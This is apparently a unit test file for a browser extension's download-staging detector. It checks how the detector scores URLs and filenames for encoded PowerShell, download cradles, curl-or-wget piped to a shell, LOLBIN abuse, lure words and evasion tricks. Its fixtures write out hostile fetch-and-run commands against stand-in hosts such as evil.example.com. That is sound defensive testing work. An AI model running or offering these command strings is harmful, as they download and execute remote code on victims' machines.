"use strict";

import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { StagingCheck } from "../../protection/StagingCheck.js";

// ── Test-only helpers (no Node-specific globals — btoa is a standard
// browser/WebExtension global already relied on by StagingCheck.js itself
// via its counterpart atob()) ────────────────────────────────────────────

/** Base64-encode a plain-ASCII string (test fixtures only — no UTF-8 needed). */
function b64(asciiString) {
    return btoa(asciiString);
}

/** Base64-encode `asciiString` as UTF-16LE bytes (PowerShell -enc style). */
function b64Utf16le(asciiString) {
    let binary = "";
    for (const ch of asciiString) {
        const code = ch.charCodeAt(0);
        binary += String.fromCharCode(code & 0xff, (code >> 8) & 0xff);
    }
    return btoa(binary);
}

// Shared defaults so each test only states what it's actually varying.
function keywords(overrides = {}) {
    return StagingCheck.checkKeywords({
        finalUrl:         "https://example.com/file",
        originalUrl:      null,
        filename:         "file",
        registeredDomain: "example.com",
        fileCategory:     "executable",
        ...overrides
    });
}

describe("StagingCheck.checkKeywords — legitimate downloads (no false positives)", () => {
    test("nvm install.sh from GitHub raw — no hit", () => {
        const r = keywords({
            finalUrl: "https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh",
            filename: "install.sh",
            registeredDomain: "githubusercontent.com",
            fileCategory: "script"
        });
        assert.equal(r.score, 0);
    });

    test("rustup-init.exe from static.rust-lang.org — no hit", () => {
        const r = keywords({
            finalUrl: "https://static.rust-lang.org/rustup/dist/x86_64-pc-windows-msvc/rustup-init.exe",
            filename: "rustup-init.exe",
            registeredDomain: "rust-lang.org"
        });
        assert.equal(r.score, 0);
    });

    test("oh-my-zsh install.sh — no hit", () => {
        const r = keywords({
            finalUrl: "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh",
            filename: "install.sh",
            registeredDomain: "githubusercontent.com",
            fileCategory: "script"
        });
        assert.equal(r.score, 0);
    });

    test("PowerShell MSI installer filename containing the word 'PowerShell' — no hit", () => {
        // LOLBIN_NAME is query/fragment-only by design precisely so a
        // legitimate filename like this never fires it.
        const r = keywords({
            finalUrl: "https://github.com/PowerShell/PowerShell/releases/download/v7.4.6/PowerShell-7.4.6-win-x64.msi",
            filename: "PowerShell-7.4.6-win-x64.msi",
            registeredDomain: "github.com"
        });
        assert.equal(r.score, 0);
    });

    test("Chrome installer from google.com — no hit, and FAKE_UPDATE vendor exception also verified", () => {
        const r = keywords({
            finalUrl: "https://dl.google.com/chrome/install/ChromeSetup.exe",
            filename: "ChromeSetup.exe",
            registeredDomain: "google.com"
        });
        assert.equal(r.score, 0);
    });

    test("plain archive download with no lure words and archive category — no hit", () => {
        const r = keywords({
            finalUrl: "https://example.com/release-v1.2.3.zip",
            filename: "release-v1.2.3.zip",
            fileCategory: "archive"
        });
        assert.equal(r.score, 0);
    });
});

describe("StagingCheck.checkKeywords — command-injection patterns (positive + negative)", () => {
    test("ENCODED_PS fires on '-enc <base64>' preceded by whitespace", () => {
        const r = keywords({
            finalUrl: "https://evil.example.com/dl?cmd=powershell -enc JABzAD0AIgBoAGUAbABsAG8AIgA7AA=="
        });
        assert.ok(r.score >= 60);
        assert.ok(r.signals.some(s => s.includes("ENCODED_PS")));
    });

    test("ENCODED_PS does NOT fire merely because '-enc' is a query-param substring with no preceding boundary", () => {
        // "x=-enc" — the dash is preceded by "=", not whitespace/quote/start,
        // so this must not match; a bare 3-letter substring match would be
        // far too eager (would hit on things like "...?format=-enc0ded").
        const r = keywords({
            finalUrl: "https://example.com/payload.exe?x=-enc JABzAD0AIgBoAGUAbABsAG8AIgA7AA=="
        });
        assert.ok(!r.signals.some(s => s.includes("ENCODED_PS")));
    });

    test("CRADLE fires on IEX / Invoke-Expression download cradle", () => {
        const r = keywords({
            finalUrl: "https://evil.example.com/stage2?cmd=IEX(New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
        });
        assert.ok(r.score >= 70);
        assert.ok(r.signals.some(s => s.includes("CRADLE")));
    });

    test("CRADLE fires on bare 'iwr https:' / 'irm https:' shorthand", () => {
        const r = keywords({ finalUrl: "https://evil.example.com/dl?c=iwr https://x/a.ps1" });
        assert.ok(r.signals.some(s => s.includes("CRADLE")));
    });

    test("CRADLE does not fire on an unrelated query with no cradle verbs", () => {
        const r = keywords({ finalUrl: "https://example.com/dl?ref=newsletter&id=42" });
        assert.ok(!r.signals.some(s => s.includes("CRADLE")));
    });

    test("PIPE_TO_SHELL fires on 'curl ... | sh'", () => {
        const r = keywords({ finalUrl: "https://evil.example.com/dl?c=curl http://x/y|sh" });
        assert.ok(r.score >= 70);
        assert.ok(r.signals.some(s => s.includes("PIPE_TO_SHELL")));
    });

    test("PIPE_TO_SHELL fires on 'wget ... | sudo bash'", () => {
        const r = keywords({ finalUrl: "https://evil.example.com/dl?c=wget http://x/y|sudo bash" });
        assert.ok(r.signals.some(s => s.includes("PIPE_TO_SHELL")));
    });

    test("PIPE_TO_SHELL does not fire on a pipe with no shell on the far side", () => {
        const r = keywords({ finalUrl: "https://example.com/dl?c=curl http://x/y|grep foo" });
        assert.ok(!r.signals.some(s => s.includes("PIPE_TO_SHELL")));
    });

    test("LOLBIN_ARGS fires on 'mshta vbscript:' invocation", () => {
        const r = keywords({ finalUrl: "https://evil.example.com/dl?c=mshta vbscript:CreateObject(1)" });
        assert.ok(r.signals.some(s => s.includes("LOLBIN_ARGS")));
    });

    test("LOLBIN_ARGS fires on 'regsvr32 /i:https:' invocation", () => {
        const r = keywords({ finalUrl: "https://evil.example.com/dl?c=regsvr32 /i:https://x/a.sct" });
        assert.ok(r.signals.some(s => s.includes("LOLBIN_ARGS")));
    });

    test("POLICY_BYPASS fires on '-ep bypass'", () => {
        const r = keywords({ finalUrl: "https://evil.example.com/dl?c=powershell -ep bypass -file a.ps1" });
        assert.ok(r.signals.some(s => s.includes("POLICY_BYPASS")));
    });

    test("POLICY_BYPASS fires on '-windowstyle hidden'", () => {
        const r = keywords({ finalUrl: "https://evil.example.com/dl?c=-windowstyle hidden -file a.ps1" });
        assert.ok(r.signals.some(s => s.includes("POLICY_BYPASS")));
    });

    test("CMD_EXEC fires on 'cmd /c'", () => {
        const r = keywords({ finalUrl: "https://evil.example.com/dl?c=cmd /c calc.exe" });
        assert.ok(r.signals.some(s => s.includes("CMD_EXEC")));
    });

    test("CMD_EXEC fires on 'chmod +x'", () => {
        // "+" is percent-encoded as %2B here — a literal "+" in a query
        // string is form-encoding shorthand for a space (normaliseField
        // converts it accordingly, same as a real browser/server would),
        // so an attacker's URL would need %2B to preserve a literal plus.
        const r = keywords({ finalUrl: "https://evil.example.com/dl?c=chmod%20%2Bx%20./payload" });
        assert.ok(r.signals.some(s => s.includes("CMD_EXEC")));
    });

    test("GATE_PARAM fires on a '?cmd=' style query parameter name", () => {
        const r = keywords({ finalUrl: "https://evil.example.com/dl?cmd=whoami" });
        assert.ok(r.signals.some(s => s.includes("GATE_PARAM")));
    });

    test("LOLBIN_NAME fires in query/fragment but is suppressed in a filename", () => {
        const inQuery = keywords({ finalUrl: "https://evil.example.com/dl?x=powershell" });
        assert.ok(inQuery.signals.some(s => s.includes("LOLBIN_NAME")));

        const inFilename = keywords({ finalUrl: "https://example.com/dl", filename: "powershell-notes.txt" });
        assert.ok(!inFilename.signals.some(s => s.includes("LOLBIN_NAME")));
    });

    test("compact (separator-stripped) LOLBIN evasion 'p.o.w.e.r.s.h.e.l.l' is caught in query", () => {
        const r = keywords({ finalUrl: "https://evil.example.com/dl?x=p.o.w.e.r.s.h.e.l.l" });
        assert.ok(r.signals.some(s => s.includes("LOLBIN_NAME")));
    });

    test("score combines multiple distinct command-pattern hits (+10 per extra group) and caps at 100", () => {
        const r = keywords({
            finalUrl: "https://evil.example.com/dl?cmd=curl http://x|sh&x=-enc QQBCAEMA&y=-ep bypass&z=cmd /c&w=rundll32 x,y"
        });
        assert.ok(r.score <= 100);
        assert.ok(r.score >= 70); // at least the top pattern's weight
    });
});

describe("StagingCheck.checkKeywords — hidden Base64 payloads", () => {
    test("a command hidden inside a Base64 query token is detected and adds the hidden-payload bonus", () => {
        const token = b64("iex (new-object net.webclient).downloadstring('http://x/a.ps1')");
        const r = keywords({ finalUrl: `https://evil.example.com/dl?data=${token}` });
        assert.ok(r.signals.some(s => s.includes("hidden in Base64")));
    });

    test("an ordinary-looking Base64 token with no command inside adds no hidden-payload bonus", () => {
        const token = b64("just a normal piece of plain english text for a token");
        const r = keywords({ finalUrl: `https://example.com/dl?data=${token}` });
        assert.ok(!r.signals.some(s => s.includes("hidden in Base64")));
    });

    test("UTF-16LE-encoded Base64 (PowerShell -enc style) is detected and decodes to ASCII before scanning", () => {
        const plain = "iex (new-object net.webclient).downloadstring('http://x/a.ps1')";
        const token = b64Utf16le(plain);
        const r = keywords({ finalUrl: `https://evil.example.com/dl?data=${token}` });
        assert.ok(r.signals.some(s => s.includes("hidden in Base64")));
    });

    test("Base64 scan is bounded — only the first MAX_B64_TOKENS tokens are checked (perf guard, no crash on many tokens)", () => {
        const junkTokens = Array.from({ length: 20 }, (_, i) =>
            b64(`filler-token-number-${i}-with-no-command-inside-it-at-all`)
        ).join("&t=");
        const r = keywords({ finalUrl: `https://example.com/dl?t=${junkTokens}` });
        assert.equal(typeof r.score, "number"); // no throw, completes
    });
});

describe("StagingCheck.checkKeywords — lure word groups", () => {
    test("FINANCE lure word ('invoice') fires on an executable filename", () => {
        const r = keywords({ filename: "Invoice_2026_overdue.exe", finalUrl: "https://free-host.example.net/Invoice_2026_overdue.exe" });
        assert.ok(r.signals.some(s => s.includes("FINANCE")));
    });

    test("DELIVERY lure word ('tracking') fires", () => {
        const r = keywords({ filename: "tracking_number.exe", finalUrl: "https://example.net/tracking_number.exe" });
        assert.ok(r.signals.some(s => s.includes("DELIVERY")));
    });

    test("PIRACY lure word ('keygen') fires at full weight on an executable", () => {
        const r = keywords({ filename: "keygen.exe", finalUrl: "https://example.net/keygen.exe" });
        assert.ok(r.signals.some(s => s.includes("PIRACY")));
        assert.ok(r.score >= 25); // ≥ PIRACY weight 35 × 1.0, floored by LURE_MAX cap only
    });

    test("GAME_CHEAT lure word ('aimbot') fires", () => {
        const r = keywords({ filename: "aimbot_loader.exe", finalUrl: "https://example.net/aimbot_loader.exe" });
        assert.ok(r.signals.some(s => s.includes("GAME_CHEAT")));
    });

    test("FAKE_UPDATE lure fires for a non-vendor domain", () => {
        const r = keywords({
            filename: "chrome_update_required.exe",
            finalUrl: "https://totally-legit-updates.example.net/chrome_update_required.exe",
            registeredDomain: "example.net"
        });
        assert.ok(r.signals.some(s => s.includes("FAKE_UPDATE")));
    });

    test("FAKE_UPDATE lure is suppressed for the real vendor domain", () => {
        const r = keywords({
            filename: "chrome_updater.exe",
            finalUrl: "https://www.google.com/chrome/update/chrome_updater.exe",
            registeredDomain: "google.com"
        });
        assert.ok(!r.signals.some(s => s.includes("FAKE_UPDATE")));
    });

    test("lure words only count once per distinct group even if the word repeats", () => {
        const r = keywords({
            filename: "invoice_invoice_overdue_overdue.exe",
            finalUrl: "https://example.net/invoice_invoice_overdue_overdue.exe"
        });
        const finCount = r.signals.filter(s => s.includes("FINANCE")).length;
        assert.equal(finCount, 1);
    });

    test("lure weight is reduced (×0.6) for archive category and zero for 'other' category", () => {
        const archive = keywords({
            filename: "keygen.zip",
            finalUrl: "https://example.net/keygen.zip",
            fileCategory: "archive"
        });
        const other = keywords({
            filename: "keygen.pdf",
            finalUrl: "https://example.net/keygen.pdf",
            fileCategory: "other"
        });
        assert.ok(archive.score > 0);
        assert.equal(other.score, 0);
    });

    test("lure score is capped at CONFIG.LURE_MAX even with many distinct groups hit", () => {
        const r = keywords({
            filename: "invoice_tracking_scan_urgent_keygen_aimbot_chrome_update.exe",
            finalUrl: "https://example.net/invoice_tracking_scan_urgent_keygen_aimbot_chrome_update.exe"
        });
        assert.ok(r.score <= StagingCheck.CONFIG.LURE_MAX + 0.001);
    });
});

describe("StagingCheck.checkKeywords — evasion + edge cases", () => {
    test("double percent-encoding is decoded within MAX_DECODE_PASSES", () => {
        // "%2520" → one pass → "%20" → second pass → " " (a literal space)
        const r = keywords({ finalUrl: "https://evil.example.com/dl?c=curl%2520http://x/y%257Csh" });
        assert.ok(r.signals.some(s => s.includes("PIPE_TO_SHELL")));
    });

    test("NFKC-normalised full-width characters are caught by the lowercase/normalise step", () => {
        // Full-width "ｉｎｖｏｉｃｅ" NFKC-normalises to "invoice"
        const r = keywords({ filename: "ｉｎｖｏｉｃｅ.exe", finalUrl: "https://example.net/ｉｎｖｏｉｃｅ.exe" });
        assert.ok(r.signals.some(s => s.includes("FINANCE")));
    });

    test("zero-width characters inserted mid-word are stripped before matching", () => {
        const zw = "​";
        const r = keywords({
            filename: `in${zw}voice.exe`,
            finalUrl: `https://example.net/in${zw}voice.exe`
        });
        assert.ok(r.signals.some(s => s.includes("FINANCE")));
    });

    test("empty/missing fields do not throw and produce a zero score", () => {
        const r = StagingCheck.checkKeywords({ finalUrl: "https://example.com/file" });
        assert.equal(r.score, 0);
    });

    test("an invalid finalUrl does not throw", () => {
        const r = StagingCheck.checkKeywords({ finalUrl: "not a url at all", filename: "x" });
        assert.equal(typeof r.score, "number");
    });

    test("fields longer than MAX_FIELD_LENGTH are capped before processing (perf/ReDoS guard)", () => {
        const hostile = "a".repeat(10000);
        const r = keywords({ finalUrl: `https://example.com/dl?x=${hostile}` });
        assert.equal(typeof r.score, "number");
    });

    test("perf: a large hostile query with many pattern hits completes well under budget", () => {
        const hostile = "a".repeat(2000) +
            "?cmd=curl x|sh&enc=-enc " + "A".repeat(100) +
            "&ep=-ep bypass&c2=cmd /c&r=rundll32 x,y";
        const start = performance.now();
        StagingCheck.checkKeywords({
            finalUrl: `https://evil.example.com/dl${hostile}`,
            filename: "dl.exe",
            registeredDomain: "example.com",
            fileCategory: "executable"
        });
        const ms = performance.now() - start;
        // Generous budget (not the tight per-download ~1ms target quoted in
        // the heuristics plan) — this guards against an accidental O(n^2)/
        // ReDoS regression, not micro-perf, and must stay stable when run
        // alongside other CPU-heavy tooling (lint/knip/jscpd) in CI.
        assert.ok(ms < 50, `expected < 50ms, took ${ms.toFixed(2)}ms`);
    });

    test("score is always within [0, 100]", () => {
        const r = keywords({
            finalUrl: "https://evil.example.com/dl?cmd=curl x|sh&enc=powershell -enc " + "A".repeat(200) +
                "&ep=-ep bypass&w=-windowstyle hidden&c2=cmd /c calc&cu=certutil -urlcache&bi=bitsadmin /transfer",
            filename: "invoice_tracking_scan_urgent_keygen_aimbot_chrome_update.exe"
        });
        assert.ok(r.score >= 0 && r.score <= 100);
    });
});

describe("StagingCheck.checkFormat", () => {
    test("returns null for a falsy/empty extension", () => {
        assert.equal(StagingCheck.checkFormat({ ext: "" }), null);
        assert.equal(StagingCheck.checkFormat({ ext: null }), null);
    });

    test("HIGH tier for Excel add-in (.xll)", () => {
        const r = StagingCheck.checkFormat({ ext: "xll", totalBytes: 50000, sizeKnown: true });
        assert.ok(r);
        assert.equal(r.tier, "HIGH");
        assert.equal(r.source, "StagingFormat");
    });

    test("HIGH tier for Windows settings shortcut (.settingcontent-ms)", () => {
        const r = StagingCheck.checkFormat({ ext: "settingcontent-ms" });
        assert.equal(r.tier, "HIGH");
    });

    test("HIGH tier for OneNote formats (.one, .onepkg)", () => {
        assert.equal(StagingCheck.checkFormat({ ext: "one" }).tier, "HIGH");
        assert.equal(StagingCheck.checkFormat({ ext: "onepkg" }).tier, "HIGH");
    });

    test("MED tier for shortcut/query/ClickOnce formats", () => {
        for (const ext of ["url", "iqy", "slk", "library-ms", "search-ms", "appref-ms", "application", "diagcab"]) {
            assert.equal(StagingCheck.checkFormat({ ext }).tier, "MED", `expected MED for .${ext}`);
        }
    });

    test("disk-image container smaller than the threshold → CONTAINER_SMALL", () => {
        const r = StagingCheck.checkFormat({ ext: "iso", totalBytes: 5 * 1024 * 1024, sizeKnown: true });
        assert.equal(r.tier, "CONTAINER_SMALL");
    });

    test("disk-image container at/above the threshold → null (real OS image)", () => {
        const r = StagingCheck.checkFormat({ ext: "iso", totalBytes: 2 * 1024 * 1024 * 1024, sizeKnown: true });
        assert.equal(r, null);
    });

    test("disk-image container with size not yet known → CONTAINER_UNKNOWN", () => {
        const r = StagingCheck.checkFormat({ ext: "img", totalBytes: 0, sizeKnown: false });
        assert.equal(r.tier, "CONTAINER_UNKNOWN");
    });

    test("disk-image container with sizeKnown true but totalBytes 0 is treated as still-unknown", () => {
        const r = StagingCheck.checkFormat({ ext: "vhd", totalBytes: 0, sizeKnown: true });
        assert.equal(r.tier, "CONTAINER_UNKNOWN");
    });

    test("an unrecognised extension returns null", () => {
        assert.equal(StagingCheck.checkFormat({ ext: "exe", totalBytes: 1000, sizeKnown: true }), null);
        assert.equal(StagingCheck.checkFormat({ ext: "pdf" }), null);
    });

    test("CONTAINER_EXTS and CONTAINER_SMALL_BYTES are exported for callers/tests that need the raw tables", () => {
        assert.ok(StagingCheck.CONTAINER_EXTS.has("iso"));
        assert.equal(typeof StagingCheck.CONTAINER_SMALL_BYTES, "number");
    });
});
